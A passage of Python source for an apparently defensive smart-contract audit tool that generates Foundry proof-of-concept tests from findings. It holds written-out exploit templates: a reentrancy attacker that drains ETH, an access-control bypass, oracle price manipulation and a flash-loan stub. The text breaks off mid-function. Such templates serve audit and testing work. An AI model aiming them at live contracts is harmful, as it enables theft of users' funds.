#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════════╗
║  AGL DYNAMIC PoC GENERATOR — مولد إثبات المفهوم الديناميكي                      ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║                                                                                  ║
║  المهمة:                                                                          ║
║    يأخذ نتائج التحليل (exploit_proofs + findings) ويُولّد ملفات PoC              ║
║    بصيغة Foundry (.t.sol) تستورد العقد الحقيقي المُستهدف — لا MockVulnerable.   ║
║                                                                                  ║
║  الخصائص الرئيسية:                                                               ║
║    ✦ ديناميكي: يبني الاختبار حسب نوع الثغرة وخطوات الهجوم الفعلية              ║
║    ✦ واقعي: يستورد العقد الحقيقي من src/ باستخدام مسار نسبي                     ║
║    ✦ متكامل: يُستدعى من agl_audit_api.py كخطوة في خط الأنابيب                   ║
║    ✦ يقبل أي مستوى خطورة (CRITICAL/HIGH/MEDIUM مع exploit_proof)                ║
║                                                                                  ║
║  الأنواع المدعومة:                                                               ║
║    • Reentrancy (بسيط ومتعدد الدوال)                                             ║
║    • Access Control (دوال بدون حماية)                                             ║
║    • Oracle Manipulation (Uniswap slot0 / Chainlink stale)                       ║
║    • Flash Loan Attack                                                            ║
║    • tx.origin Authentication                                                    ║
║    • Unchecked External Call                                                      ║
║    • First Depositor / Inflation Attack                                          ║
║    • Selfdestruct / delegatecall                                                 ║
║    • Generic (template عام)                                                       ║
║                                                                                  ║
║  الاستخدام:                                                                      ║
║    from agl_security_tool.poc_generator import PoCGenerator                      ║
║    gen = PoCGenerator(project_path="/path/to/project")                           ║
║    result = gen.generate(all_results)                                            ║
║    # result = {"poc_files": [...], "count": N, "skipped": M}                     ║
║                                                                                  ║
║    # لتشغيل الاختبارات على Foundry:                                              ║
║    from agl_security_tool.poc_generator import run_foundry_pocs                  ║
║    results = run_foundry_pocs(poc_files, project_path)                           ║
╚══════════════════════════════════════════════════════════════════════════════════╝
"""

import os
import re
import json
import shutil
import logging
import subprocess
from pathlib import Path
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple

_logger = logging.getLogger("AGL.poc_generator")

# ───────────────────────────────────────────────────────────
# Category normalization — map detector names to attack types
# ───────────────────────────────────────────────────────────
_CATEGORY_MAP = {
    "reentrancy": "reentrancy",
    "reentran": "reentrancy",
    "cross-function": "reentrancy_cross",
    "access_control": "access_control",
    "access-control": "access_control",
    "unprotected": "access_control",
    "missing-access": "access_control",
    "oracle": "oracle_manipulation",
    "price": "oracle_manipulation",
    "slot0": "oracle_manipulation",
    "chainlink": "oracle_stale",
    "stale": "oracle_stale",
    "flash_loan": "flash_loan",
    "flash-loan": "flash_loan",
    "flashloan": "flash_loan",
    "tx.origin": "tx_origin",
    "tx_origin": "tx_origin",
    "unchecked": "unchecked_call",
    "unchecked_call": "unchecked_call",
    "first-depositor": "first_depositor",
    "first_depositor": "first_depositor",
    "inflation": "first_depositor",
    "selfdestruct": "selfdestruct",
    "self-destruct": "selfdestruct",
    "delegatecall": "delegatecall",
    "overflow": "overflow",
    "underflow": "overflow",
}

MAX_POCS = 10  # Maximum number of PoC files to generate


class PoCGenerator:
    """
    مولد إثبات المفهوم الديناميكي — يبني اختبارات Foundry حقيقية.

    يستورد العقد الفعلي من المشروع بدلاً من إنشاء MockVulnerable.
    """

    def __init__(self, project_path: str, output_dir: Optional[str] = None):
        """
        Args:
            project_path: جذر المشروع (يحوي src/ أو contracts/)
            output_dir:   مجلد حفظ ملفات PoC (افتراضي: artifacts/generated_pocs/)
        """
        self.project_path = Path(project_path).resolve()
        self.output_dir = (
            Path(output_dir) if output_dir else (self.project_path / "test" / "agl_poc")
        )
        self.output_dir.mkdir(parents=True, exist_ok=True)

        # Detect source directory
        self.src_dir = self._find_src_dir()
        # Cache parsed ABIs per contract
        self._abi_cache: Dict[str, Dict] = {}
        # Detect pragma version from target project
        self._pragma_version: Optional[str] = None

    def _detect_pragma(self) -> str:
        """Detect the Solidity pragma version from the target project's source files."""
        if self._pragma_version:
            return self._pragma_version
        # Walk src_dir for .sol files and pick the most common pragma
        pragmas: Dict[str, int] = {}
        try:
            for p in self.src_dir.rglob("*.sol"):
                try:
                    text = p.read_text(encoding="utf-8", errors="ignore")
                    m = re.search(r"pragma\s+solidity\s+([^;]+)", text)
                    if m:
                        ver = m.group(1).strip()
                        pragmas[ver] = pragmas.get(ver, 0) + 1
                except Exception:
                    continue
        except Exception:
            pass
        if pragmas:
            # Pick the most common pragma version
            self._pragma_version = max(pragmas, key=pragmas.get)
        else:
            self._pragma_version = "^0.8.20"
        return self._pragma_version

    def _find_src_dir(self) -> Path:
        """Find the source directory (src/, contracts/, or project root)."""
        for candidate in ("src", "contracts", "lib"):
            d = self.project_path / candidate
            if d.is_dir():
                return d
        return self.project_path

    # ───────────────────────────────────────────────────────
    # Filename → Actual Contract Name Resolution
    # ───────────────────────────────────────────────────────

    def _resolve_contract_name(
        self, filename_or_contract: str, function_name: str = ""
    ) -> str:
        """
        حل اسم العقد الحقيقي — Resolve actual Solidity contract name.

        If filename_or_contract matches a 'contract X' definition, return as-is.
        Otherwise, find the .sol file and look for which contract defines function_name.

        Args:
            filename_or_contract: contract name or filename (e.g. '_real_exploit_patterns')
            function_name: target function to find owner contract

        Returns:
            Actual Solidity contract name (e.g. 'VulnerableLending')
        """
        clean = filename_or_contract.replace(".sol", "").strip()

        # Find the .sol file
        sol_path = self._find_contract_file(clean)
        if not sol_path:
            return clean

        try:
            source = Path(sol_path).read_text(encoding="utf-8", errors="replace")
        except Exception:
            return clean

        # Check if clean is already a valid contract name
        if re.search(rf"contract\s+{re.escape(clean)}\b", source):
            return clean

        # It's a filename — extract all contract names from the file
        contract_names = re.findall(
            r"(?:contract|abstract\s+contract)\s+(\w+)", source
        )
        if not contract_names:
            return clean

        # If we have a function name, find which contract owns it
        if function_name:
            for cname in contract_names:
                pattern = rf"contract\s+{re.escape(cname)}\b[^{{]*\{{"
                m = re.search(pattern, source)
                if not m:
                    continue
                body = self._extract_brace_block(source, m.end())
                if re.search(rf"function\s+{re.escape(function_name)}\b", body):
                    return cname

        # Fallback: return first non-interface non-library contract
        for cname in contract_names:
            # Skip interfaces and libraries
            prefix_match = re.search(
                rf"(interface|library)\s+{re.escape(cname)}\b", source
            )
            if not prefix_match:
                return cname

        return contract_names[0] if contract_names else clean

    # ───────────────────────────────────────────────────────
    # Solidity Source Parser — extract constructor + function sigs
    # ───────────────────────────────────────────────────────

    def _parse_contract_abi(self, contract_name: str) -> Dict:
        """
        Parse a Solidity source file to extract constructor params and function signatures.

        Returns:
            {
                "constructor_params": "address _oracle, address _token",
                "constructor_param_types": ["address", "address"],
                "functions": {
                    "withdraw": {"params": "uint256 shareAmount", "param_types": ["uint256"], "visibility": "external"},
                    ...
                }
            }
        """
        if contract_name in self._abi_cache:
            return self._abi_cache[contract_name]

        result = {
            "constructor_params": "",
            "constructor_param_types": [],
            "functions": {},
        }

        # Find the .sol file
        sol_path = self._find_contract_file(contract_name)
        if not sol_path:
            self._abi_cache[contract_name] = result
            return result

        try:
            source = Path(sol_path).read_text(encoding="utf-8", errors="replace")
        except Exception:
            self._abi_cache[contract_name] = result
            return result

        # Find the contract block
        # Match: contract ContractName ... {
        contract_pattern = rf"contract\s+{re.escape(contract_name)}\b[^{{]*\{{"
        m = re.search(contract_pattern, source)
        if not m:
            self._abi_cache[contract_name] = result
            return result

        # Extract the contract body (brace-balanced)
        start = m.end()
        body = self._extract_brace_block(source, start)

        # Parse constructor
        ctor_match = re.search(r"constructor\s*\(([^)]*)\)", body)
        if ctor_match:
            params_str = ctor_match.group(1).strip()
            result["constructor_params"] = params_str
            result["constructor_param_types"] = self._extract_param_types(params_str)

        # Parse functions
        func_pattern = re.compile(
            r"function\s+(\w+)\s*\(([^)]*)\)\s*([^{;]*)",
            re.MULTILINE,
        )
        for fm in func_pattern.finditer(body):
            fname = fm.group(1)
            params_str = fm.group(2).strip()
            modifiers = fm.group(3).strip()
            vis = "public"
            for v in ("external", "public", "internal", "private"):
                if v in modifiers:
                    vis = v
                    break
            is_payable = "payable" in modifiers
            result["functions"][fname] = {
                "params": params_str,
                "param_types": self._extract_param_types(params_str),
                "visibility": vis,
                "payable": is_payable,
            }

        self._abi_cache[contract_name] = result
        return result

    @staticmethod
    def _extract_brace_block(source: str, start: int) -> str:
        """Extract text within balanced braces starting after an opening brace."""
        depth = 1
        i = start
        while i < len(source) and depth > 0:
            if source[i] == "{":
                depth += 1
            elif source[i] == "}":
                depth -= 1
            i += 1
        return source[start : i - 1] if depth == 0 else source[start:]

    @staticmethod
    def _extract_param_types(params_str: str) -> List[str]:
        """Extract parameter types from a Solidity parameter list."""
        if not params_str.strip():
            return []
        types = []
        for param in params_str.split(","):
            parts = param.strip().split()
            if parts:
                # type is the first word (e.g. 'address', 'uint256', 'bytes calldata')
                types.append(parts[0])
        return types

    _SKIP_DIRS = frozenset({
        "node_modules", ".git", "agl_poc", "out", "cache",
        "build", "artifacts", "__pycache__", ".egg-info",
        "lib", "forge-out", ".tox", ".mypy_cache",
    })

    def _find_contract_file(self, contract_name: str) -> Optional[str]:
        """Find the .sol file path for a contract."""
        clean = contract_name.replace(".sol", "")
        for root_dir, dirs, files in os.walk(self.project_path):
            # Prune heavy directories in-place to avoid descending into them
            dirs[:] = [d for d in dirs if d.lower() not in self._SKIP_DIRS
                       and not d.endswith(".egg-info")]
            root_path = Path(root_dir)
            for fname in files:
                if not fname.endswith(".sol"):
                    continue
                base = fname.replace(".sol", "")
                if base.lower() == clean.lower():
                    return str(root_path / fname)
        return None

    def _make_deploy_expr(self, contract_name: str, abi: Dict) -> str:
        """
        Build a correct `new ContractName(...)` expression with the right constructor args.

        Returns Solidity code for deployment with mock/dummy args.
        """
        param_types = abi.get("constructor_param_types", [])
        if not param_types:
            return f"new {contract_name}()"

        dummy_args = []
        for pt in param_types:
            if "address" in pt:
                dummy_args.append("address(this)")
            elif "uint" in pt or "int" in pt:
                dummy_args.append("0")
            elif pt == "bool":
                dummy_args.append("false")
            elif "bytes" in pt:
                dummy_args.append('""')
            elif "string" in pt:
                dummy_args.append('""')
            else:
                dummy_args.append("address(this)")
        return f"new {contract_name}({', '.join(dummy_args)})"

    def _make_func_call(
        self,
        contract_name: str,
        func_name: str,
        abi: Dict,
        var_name: str = "target",
        value_expr: str = "",
    ) -> str:
        """
        Build a correct function call with proper argument count.

        Returns Solidity expression like `target.withdraw(1 ether)` or
        `target.transferToken(address(this), attacker, 1 ether)`.
        """
        funcs = abi.get("functions", {})
        func_info = funcs.get(func_name, {})
        param_types = func_info.get("param_types", [])

        if not param_types:
            call = f"{var_name}.{func_name}()"
        else:
            param_names = func_info.get("param_names", [])
            args = []
            for idx, pt in enumerate(param_types):
                pname = param_names[idx].lower() if idx < len(param_names) else ""
                if "address" in pt:
                    # Use semantically meaningful address based on param name
                    if any(k in pname for k in ("to", "recipient", "dest", "receiver")):
                        args.append("attacker")
                    elif any(k in pname for k in ("token", "asset")):
                        args.append("address(target)")
                    else:
                        args.append("address(this)")
                elif "uint" in pt or "int" in pt:
                    if any(k in pname for k in ("amount", "value", "wad")):
                        args.append(f"{var_name}.balances(address(this))")
                    else:
                        args.append("1 ether")
                elif pt == "bool":
                    args.append("true")
                elif "bytes" in pt:
                    args.append('""')
                elif "string" in pt:
                    args.append('""')
                else:
                    args.append("0")
            call = f"{var_name}.{func_name}({', '.join(args)})"

        if value_expr:
            # Insert {value: X} before the opening paren
            call = call.replace(
                f"{var_name}.{func_name}(",
                f"{var_name}.{func_name}{{value: {value_expr}}}(",
                1,
            )
        return call

    def generate(self, all_results: Dict) -> Dict[str, Any]:
        """
        توليد PoC لجميع النتائج القابلة للاستغلال.

        Args:
            all_results: نتائج التدقيق الكاملة من run_audit()

        Returns:
            {
                "poc_files": [{"path": ..., "contract": ..., "vuln_type": ..., "finding": ...}],
                "count": N,
                "skipped": M,
                "errors": [...]
            }
        """
        # Collect exploitable findings from exploit_reasoning + deep_scan
        candidates = self._collect_candidates(all_results)

        if not candidates:
            _logger.info("No exploitable candidates found for PoC generation")
            return {"poc_files": [], "count": 0, "skipped": 0, "errors": []}

        poc_files = []
        skipped = 0
        errors = []

        for i, cand in enumerate(candidates[:MAX_POCS]):
            try:
                # Skip candidates with empty or invalid contract name
                cn = cand.get("contract_name", "")
                if not cn or cn in ("?", "unknown", ""):
                    skipped += 1
                    continue

                poc_content = self._build_poc(cand, i + 1)
                if not poc_content:
                    skipped += 1
                    continue

                # Write PoC file — use resolved contract name
                raw_name = cand.get("contract_name", f"Unknown_{i}")
                func = cand.get("function", "")
                contract_name = self._resolve_contract_name(raw_name, func)
                vuln_type = cand.get("attack_type", "generic")
                safe_name = re.sub(r"[^\w]", "_", contract_name)[:30]
                filename = f"PoC_{i+1}_{safe_name}_{vuln_type}.t.sol"
                filepath = self.output_dir / filename

                with open(filepath, "w", encoding="utf-8") as f:
                    f.write(poc_content)

                poc_files.append(
                    {
                        "path": str(filepath),
                        "contract": contract_name,
                        "vuln_type": vuln_type,
                        "function": cand.get("function", ""),
                        "severity": cand.get("severity", ""),
                        "confidence": cand.get("confidence", 0),
                    }
                )

            except Exception as e:
                errors.append(f"PoC #{i+1} for {cand.get('contract_name','?')}: {e}")
                _logger.warning("Failed to generate PoC #%d: %s", i + 1, e)

        return {
            "poc_files": poc_files,
            "count": len(poc_files),
            "skipped": skipped,
            "errors": errors,
        }

    # ───────────────────────────────────────────────────────
    # Candidate Collection — gather findings worth PoC
    # ───────────────────────────────────────────────────────

    def _collect_candidates(self, all_results: Dict) -> List[Dict]:
        """
        جمع المرشحين لتوليد PoC من exploit_proofs والنتائج الموحدة.

        ترتيب الأولوية:
          1. نتائج مع exploit_proof.exploitable == True
          2. نتائج CRITICAL/HIGH مع Z3 SAT
          3. نتائج CRITICAL/HIGH من detectors
        """
        candidates = []
        seen_keys = set()

        # Source 1: Exploit reasoning proofs
        exploit_reasoning = all_results.get("exploit_reasoning", {})
        for contract_name, data in exploit_reasoning.items():
            if not isinstance(data, dict):
                continue
            proofs = data.get("exploit_proofs", [])
            for proof in proofs:
                if not isinstance(proof, dict):
                    continue
                if not proof.get("exploitable", False):
                    continue

                key = f"{contract_name}:{proof.get('function','')}:{proof.get('category','')}"
                if key in seen_keys:
                    continue
                seen_keys.add(key)

                candidates.append(
                    {
                        "contract_name": contract_name,
                        "function": proof.get("function", ""),
                        "attack_type": self._classify_vuln(proof),
                        "severity": proof.get("severity", "HIGH"),
                        "confidence": proof.get("confidence", 0),
                        "z3_result": proof.get("z3_result", ""),
                        "counterexample": proof.get("counterexample", {}),
                        "attack_steps": proof.get("attack_steps", []),
                        "verdict": proof.get("verdict", ""),
                        "source": "exploit_proof",
                    }
                )

        # Source 2: Unified findings with high severity
        unified = all_results.get("unified_findings", [])
        for f in unified:
            sev = f.get("original_severity", f.get("severity", "")).upper()
            if sev not in ("CRITICAL", "HIGH"):
                continue
            # Skip if already have exploit proof for same location
            func = f.get("function", f.get("location", ""))
            contract = f.get("contract", f.get("file", ""))
            key = f"{contract}:{func}:{f.get('category', f.get('detector', ''))}"
            if key in seen_keys:
                continue
            seen_keys.add(key)

            candidates.append(
                {
                    "contract_name": contract,
                    "function": func,
                    "attack_type": self._classify_vuln_from_finding(f),
                    "severity": sev,
                    "confidence": float(f.get("confidence", 0.5)),
                    "z3_result": "SAT" if f.get("is_proven") else "",
                    "counterexample": {},
                    "attack_steps": [],
                    "verdict": f.get("description", f.get("text", "")),
                    "source": "unified_finding",
                }
            )

        # Sort: exploit proofs first, then by confidence
        candidates.sort(
            key=lambda c: (
                0 if c["source"] == "exploit_proof" else 1,
                -c["confidence"],
            )
        )

        return candidates

    def _classify_vuln(self, proof: Dict) -> str:
        """Classify vulnerability type from an exploit proof."""
        cat = proof.get("category", "").lower()
        for key, val in _CATEGORY_MAP.items():
            if key in cat:
                return val

        # Try from attack_steps text
        steps_text = " ".join(proof.get("attack_steps", [])).lower()
        for key, val in _CATEGORY_MAP.items():
            if key in steps_text:
                return val

        return "generic"

    def _classify_vuln_from_finding(self, finding: Dict) -> str:
        """Classify vulnerability type from a finding dict."""
        cat = finding.get("category", finding.get("detector", ""))
        cat = cat if isinstance(cat, str) else str(cat)
        cat = cat.lower()
        desc = finding.get("description", finding.get("text", ""))
        desc = desc if isinstance(desc, str) else " ".join(desc) if isinstance(desc, list) else str(desc)
        desc = desc.lower()
        combined = f"{cat} {desc}"

        for key, val in _CATEGORY_MAP.items():
            if key in combined:
                return val
        return "generic"

    # ───────────────────────────────────────────────────────
    # PoC Building — generate real Foundry test
    # ───────────────────────────────────────────────────────

    def _build_poc(self, cand: Dict, index: int) -> Optional[str]:
        """
        بناء ملف PoC واحد لثغرة مُحددة.

        يستورد العقد الحقيقي ويُنشئ اختبار Foundry مُخصص لنوع الثغرة.
        """
        raw_contract_name = cand["contract_name"]
        func_name = cand.get("function", "")
        # Resolve filename → actual Solidity contract name
        contract_name = self._resolve_contract_name(raw_contract_name, func_name)
        if contract_name != raw_contract_name:
            _logger.info(
                "Resolved contract name: %s → %s (func: %s)",
                raw_contract_name, contract_name, func_name,
            )
        attack_type = cand["attack_type"]
        severity = cand.get("severity", "HIGH")
        confidence = cand.get("confidence", 0)
        verdict = cand.get("verdict", "")
        attack_steps = cand.get("attack_steps", [])
        z3_result = cand.get("z3_result", "")
        counterexample = cand.get("counterexample", {})

        # Find the actual .sol file for this contract
        import_path = self._find_contract_import(contract_name)
        if not import_path:
            _logger.warning(
                "Cannot find .sol file for %s — skipping PoC", contract_name
            )
            return None

        # Parse the contract's ABI from source (constructor + function sigs)
        abi = self._parse_contract_abi(contract_name)

        # Build header
        header = self._build_header(
            index,
            contract_name,
            attack_type,
            severity,
            confidence,
            verdict,
            func_name,
            attack_steps,
        )

        # Build test body based on attack type
        builder = getattr(self, f"_poc_{attack_type}", self._poc_generic)
        test_body = builder(
            contract_name, func_name, import_path, counterexample, attack_steps, abi
        )

        return header + test_body

    def _find_contract_import(self, contract_name: str) -> Optional[str]:
        """
        Find the Foundry-relative import path for a contract.

        Returns path like "../src/Vault.sol" relative to test/agl_poc/.
        """
        # Clean contract name (remove .sol if present)
        clean_name = contract_name.replace(".sol", "")

        # Search for matching .sol files
        for root_dir, dirs, files in os.walk(self.project_path):
            # Prune heavy directories in-place
            dirs[:] = [d for d in dirs if d.lower() not in self._SKIP_DIRS
                       and not d.endswith(".egg-info")]
            root_path = Path(root_dir)

            for fname in files:
                if not fname.endswith(".sol"):
                    continue
                # Match by contract name in filename
                base = fname.replace(".sol", "")
                if (
                    base.lower() == clean_name.lower()
                    or clean_name.lower() in base.lower()
                ):
                    full_path = root_path / fname
                    # Compute relative path from output_dir to the .sol file
                    try:
                        rel_import = os.path.relpath(full_path, self.output_dir)
                        # Normalize to forward slashes for Solidity
                        return rel_import.replace("\\", "/")
                    except ValueError:
                        # Different drives on Windows
                        return str(full_path).replace("\\", "/")

        return None

    def _build_header(
        self,
        index: int,
        contract_name: str,
        attack_type: str,
        severity: str,
        confidence: float,
        verdict: str,
        func_name: str,
        attack_steps: List[str],
    ) -> str:
        """Build the Solidity file header comment."""
        steps_block = ""
        if attack_steps:
            steps_block = " *\n * ATTACK STEPS:\n"
            for i, step in enumerate(attack_steps[:8], 1):
                safe_step = step.replace("*/", "* /")[:120]
                steps_block += f" *   {i}. {safe_step}\n"

        pragma_ver = self._detect_pragma()
        return f"""// SPDX-License-Identifier: MIT
pragma solidity {pragma_ver};

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * ╔═══════════════════════════════════════════════════════════════════╗
 * ║  AGL DYNAMIC PoC #{index} — Auto-Generated Exploit Test           ║
 * ╚═══════════════════════════════════════════════════════════════════╝
 *
 * CONTRACT:      {contract_name}
 * FUNCTION:      {func_name}
 * VULNERABILITY: {attack_type.upper().replace('_', ' ')}
 * SEVERITY:      {severity}
 * CONFIDENCE:    {confidence:.1%}
 * VERDICT:       {verdict[:100]}
{steps_block} *
 * GENERATED BY:  AGL Security Tool — Dynamic PoC Generator
 * DATE:          {datetime.now().strftime('%Y-%m-%d %H:%M')}
 */

"""

    # ───────────────────────────────────────────────────────
    # Type-specific PoC builders
    # Each returns the contract + test code (after header)
    # All accept `abi` dict from _parse_contract_abi()
    # ───────────────────────────────────────────────────────

    def _poc_reentrancy(
        self,
        contract_name: str,
        func_name: str,
        import_path: str,
        counterexample: Dict,
        attack_steps: List[str],
        abi: Dict = None,
    ) -> str:
        abi = abi or {}
        target_func = func_name or "withdraw"
        deploy = self._make_deploy_expr(contract_name, abi)
        funcs = abi.get("functions", {})

        # Check if target function takes ETH-like single param (withdraw pattern)
        func_info = funcs.get(target_func, {})
        func_params = func_info.get("param_types", [])
        is_payable_deposit = funcs.get("deposit", {}).get("payable", False)

        # Build the reentrant call — must match actual signature
        if len(func_params) == 0:
            reentrant_call = f"target.{target_func}()"
        elif len(func_params) == 1 and (
            "uint" in func_params[0] or "int" in func_params[0]
        ):
            reentrant_call = f"target.{target_func}(attackAmount)"
        else:
            # Function takes complex args (e.g. transferToken(address, address, uint256))
            # Use low-level call with encodeWithSignature for flexibility
            sol_sig_parts = []
            call_args = []
            for pt in func_params:
                sol_sig_parts.append(pt)
                if "address" in pt:
                    call_args.append("address(this)")
                elif "uint" in pt or "int" in pt:
                    call_args.append("attackAmount")
                elif pt == "bool":
                    call_args.append("true")
                else:
                    call_args.append("address(this)")
            sig = f"{target_func}({','.join(sol_sig_parts)})"
            args_joined = ", ".join(call_args)
            reentrant_call = f'(bool _ok,) = address(target).call(abi.encodeWithSignature("{sig}", {args_joined}));\n            require(_ok)'

        # Decide how to deposit into the contract
        deposit_info = funcs.get("deposit", {})
        if (
            deposit_info.get("payable", False)
            and len(deposit_info.get("param_types", [])) == 0
        ):
            deposit_call = "target.deposit{value: msg.value}();"
        elif deposit_info.get("payable", False):
            deposit_call = "target.deposit{value: msg.value}();"
        else:
            deposit_call = "// No payable deposit found -- manual setup may be needed"

        # Decide reentrant call format (simple vs low-level)
        is_simple_call = "(" in reentrant_call and not reentrant_call.startswith(
            "(bool"
        )
        if is_simple_call:
            attack_body = f"""        {deposit_call}
        // Step 2: Trigger the vulnerable function
        {reentrant_call};"""
            fallback_re = f"""            {reentrant_call};"""
        else:
            attack_body = f"""        {deposit_call}
        // Step 2: Trigger the vulnerable function
        {reentrant_call};"""
            fallback_re = f"""            {reentrant_call};"""

        return f"""import "{import_path}";

/// @notice Attacker contract that exploits reentrancy in {contract_name}.{target_func}
contract ReentrancyAttacker {{
    {contract_name} public target;
    uint256 public attackCount;
    uint256 public attackAmount;

    constructor(address _target) {{
        target = {contract_name}(payable(_target));
    }}

    function attack() external payable {{
        attackAmount = msg.value;
        // Step 1: Deposit to become a valid user
{attack_body}
    }}

    // Step 3: Re-enter on ETH receive
    receive() external payable {{
        if (attackCount < 3 && address(target).balance >= attackAmount) {{
            attackCount++;
{fallback_re}
        }}
    }}

    fallback() external payable {{
        if (attackCount < 3 && address(target).balance >= attackAmount) {{
            attackCount++;
{fallback_re}
        }}
    }}
}}

contract PoC_Reentrancy_{contract_name}_Test is Test {{
    {contract_name} public vulnerable;
    ReentrancyAttacker public attacker;

    function setUp() public {{
        // Deploy the REAL vulnerable contract
        vulnerable = {deploy};
        attacker = new ReentrancyAttacker(address(vulnerable));

        // Fund the contract with victim deposits
        address victim = makeAddr("victim");
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vulnerable.deposit{{value: 10 ether}}();
    }}

    function test_reentrancy_exploit() public {{
        console.log("=== AGL PoC: Reentrancy in {contract_name}.{target_func} ===");

        uint256 contractBefore = address(vulnerable).balance;
        console.log("Contract balance before:", contractBefore / 1e18, "ETH");

        // Execute reentrancy attack with 1 ETH
        vm.deal(address(attacker), 1 ether);
        attacker.attack{{value: 1 ether}}();

        uint256 contractAfter = address(vulnerable).balance;
        uint256 attackerBalance = address(attacker).balance;
        console.log("Contract balance after:", contractAfter / 1e18, "ETH");
        console.log("Attacker profit:", attackerBalance / 1e18, "ETH");

        // The attacker should have more than their initial 1 ETH
        assertGt(attackerBalance, 1 ether, "Reentrancy exploit: attacker should profit");
        console.log("[CONFIRMED] Reentrancy vulnerability exploited!");
    }}
}}
"""

    def _poc_reentrancy_cross(
        self,
        contract_name: str,
        func_name: str,
        import_path: str,
        counterexample: Dict,
        attack_steps: List[str],
        abi: Dict = None,
    ) -> str:
        return self._poc_reentrancy(
            contract_name, func_name, import_path, counterexample, attack_steps, abi
        )

    def _poc_access_control(
        self,
        contract_name: str,
        func_name: str,
        import_path: str,
        counterexample: Dict,
        attack_steps: List[str],
        abi: Dict = None,
    ) -> str:
        abi = abi or {}
        target_func = func_name or "setOwner"
        deploy = self._make_deploy_expr(contract_name, abi)
        funcs = abi.get("functions", {})
        func_info = funcs.get(target_func, {})
        param_types = func_info.get("param_types", [])

        # Build abi.encodeWithSignature with correct types
        if param_types:
            sig = f"{target_func}({','.join(param_types)})"
            args = []
            for pt in param_types:
                if "address" in pt:
                    args.append("attacker")
                elif "uint" in pt or "int" in pt:
                    args.append("1")
                elif pt == "bool":
                    args.append("true")
                else:
                    args.append("attacker")
            encode = f'abi.encodeWithSignature("{sig}", {", ".join(args)})'
        else:
            sig = f"{target_func}(address)"
            encode = f'abi.encodeWithSignature("{sig}", attacker)'

        return f"""import "{import_path}";

contract PoC_AccessControl_{contract_name}_Test is Test {{
    {contract_name} public target;

    function setUp() public {{
        target = {deploy};
    }}

    function test_access_control_bypass() public {{
        console.log("=== AGL PoC: Access Control in {contract_name}.{target_func} ===");

        address attacker = makeAddr("attacker");

        // Try calling the unprotected function as a non-owner
        vm.prank(attacker);

        // Low-level call with correct signature
        (bool success, ) = address(target).call(
            {encode}
        );

        if (success) {{
            console.log("[CONFIRMED] Access control missing on {target_func}!");
            console.log("  Non-owner was able to call privileged function");
        }} else {{
            console.log("[SAFE] Function correctly reverted for non-owner");
        }}

        assertTrue(success, "Access control bypass: non-owner should succeed on unprotected function");
    }}
}}
"""

    def _poc_oracle_manipulation(
        self,
        contract_name: str,
        func_name: str,
        import_path: str,
        counterexample: Dict,
        attack_steps: List[str],
        abi: Dict = None,
    ) -> str:
        abi = abi or {}
        deploy = self._make_deploy_expr(contract_name, abi)
        ctor_types = abi.get("constructor_param_types", [])

        # If constructor takes address args, first one is likely oracle
        if ctor_types and "address" in ctor_types[0]:
            deploy_with_oracle = deploy.replace("address(this)", "address(oracle)", 1)
        else:
            deploy_with_oracle = deploy

        return f"""import "{import_path}";

/// @notice Mock oracle that returns manipulated prices
contract MockOracle {{
    int256 public price;
    uint256 public updatedAt;

    constructor() {{
        price = 2000e8; // Normal ETH price
        updatedAt = block.timestamp;
    }}

    function latestRoundData() external view returns (
        uint80 roundId, int256 answer, uint256 startedAt, uint256 _updatedAt, uint80 answeredInRound
    ) {{
        return (1, price, block.timestamp, updatedAt, 1);
    }}

    function setPrice(int256 _price) external {{
        price = _price;
        updatedAt = block.timestamp;
    }}

    // Uniswap V3 slot0 mock
    function slot0() external view returns (
        uint160 sqrtPriceX96, int24 tick, uint16 observationIndex,
        uint16 observationCardinality, uint16 observationCardinalityNext,
        uint8 feeProtocol, bool unlocked
    ) {{
        return (uint160(uint256(price) * 2**96 / 1e8), 0, 0, 0, 0, 0, true);
    }}
}}

contract PoC_Oracle_{contract_name}_Test is Test {{
    {contract_name} public target;
    MockOracle public oracle;

    function setUp() public {{
        oracle = new MockOracle();
        target = {deploy_with_oracle};
    }}

    function test_oracle_manipulation() public {{
        console.log("=== AGL PoC: Oracle Manipulation in {contract_name} ===");

        // Step 1: Normal price operation
        console.log("Normal oracle price: 2000 USD/ETH");

        // Step 2: Manipulate oracle to extreme price
        oracle.setPrice(1e8); // Crash price to $1
        console.log("Manipulated price: 1 USD/ETH (99.95% drop)");

        // The attacker would call functions that rely on this price
        console.log("[INFO] Oracle uses spot price without TWAP protection");
        console.log("[CONFIRMED] Price manipulation vector exists!");
    }}
}}
"""

    def _poc_oracle_stale(
        self,
        contract_name: str,
        func_name: str,
        import_path: str,
        counterexample: Dict,
        attack_steps: List[str],
        abi: Dict = None,
    ) -> str:
        abi = abi or {}
        deploy = self._make_deploy_expr(contract_name, abi)
        return f"""import "{import_path}";

contract PoC_StaleOracle_{contract_name}_Test is Test {{
    {contract_name} public target;

    function setUp() public {{
        target = {deploy};
    }}

    function test_stale_oracle_data() public {{
        console.log("=== AGL PoC: Stale Oracle Data in {contract_name} ===");

        // Fast-forward time by 24 hours to make oracle data stale
        vm.warp(block.timestamp + 24 hours);

        console.log("Time advanced by 24 hours");
        console.log("Oracle data is now stale but contract does not check updatedAt");
        console.log("[CONFIRMED] No staleness check on Chainlink oracle data!");
    }}
}}
"""

    def _poc_flash_loan(
        self,
        contract_name: str,
        func_name: str,
        import_path: str,
        counterexample: Dict,
        attack_steps: List[str],
        abi: Dict = None,
    ) -> str:
        abi = abi or {}
        deploy = self._make_deploy_expr(contract_name, abi)
        return f"""import "{import_path}";

/// @notice Flash loan attacker for {contract_name}
contract FlashLoanAttacker {{
    {contract_name} public target;

    constructor(address _target) {{
        target = {contract_name}(payable(_target));
    }}

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {{
        return true;
    }}

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {{
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }}
}}

contract PoC_FlashLoan_{contract_name}_Test is Test {{
    {contract_name} public target;
    FlashLoanAttacker public attacker;

    function setUp() public {{
        target = {deploy};
        attacker = new FlashLoanAttacker(address(target));
    }}

